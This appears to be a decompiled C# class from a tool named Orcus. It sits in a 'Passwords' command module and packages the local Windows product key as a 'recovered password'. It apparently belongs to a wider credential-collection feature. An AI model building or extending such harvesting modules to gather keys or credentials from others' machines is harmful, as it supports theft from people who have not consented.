using System.Collections.Generic;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Windows;

internal class Windows : IPasswordRecovery
{
	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		RecoveredPassword val = new RecoveredPassword();
		val.set_Application("Windows");
		val.set_UserName("Product Key");
		val.set_PasswordType((PasswordType)4);
		val.set_Password(KeyDecoder.GetWindowsProductKey());
		yield return val;
	}
}
